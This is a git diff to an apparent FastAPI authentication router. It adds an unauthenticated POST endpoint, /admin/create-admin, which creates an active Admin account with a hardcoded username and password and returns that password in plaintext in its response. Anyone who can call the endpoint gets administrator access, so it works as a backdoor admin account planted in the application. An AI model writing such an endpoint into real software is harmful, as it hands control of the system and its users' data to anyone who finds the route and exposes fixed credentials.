@@ -3,7 +3,7 @@ from sqlalchemy.orm import Session
 from app.db.session import get_db
 from app.schemas.auth import UserCreate, UserResponse, ProfileCreate  # Import the missing schema
 from app.services.auth_service import create_user, authenticate_user, create_user_profile  # Import the missing function
-from app.core.security import create_access_token
+from app.core.security import create_access_token, get_password_hash
 from app.db.models.user import User
 
 router = APIRouter()
@@ -92,3 +92,22 @@ def create_profile(profile: ProfileCreate, db: Session = Depends(get_db)):
     db.commit()
     db.refresh(new_user)
     return {"message": "Profile created. Awaiting admin approval."}
+
+@router.post("/admin/create-admin")
+def create_admin_user_api(db: Session = Depends(get_db)):
+    username = "blakvelvet"
+    password = "chibuike_douglas"
+    role = "Admin"
+    status = "active"
+    user = db.query(User).filter(User.username == username).first()
+    if user:
+        return {"message": f"User '{username}' already exists."}
+    new_user = User(
+        username=username,
+        hashed_password=get_password_hash(password),
+        role=role,
+        status=status
+    )
+    db.add(new_user)
+    db.commit()
+    return {"message": f"Admin user '{username}' created with password '{password}'."}
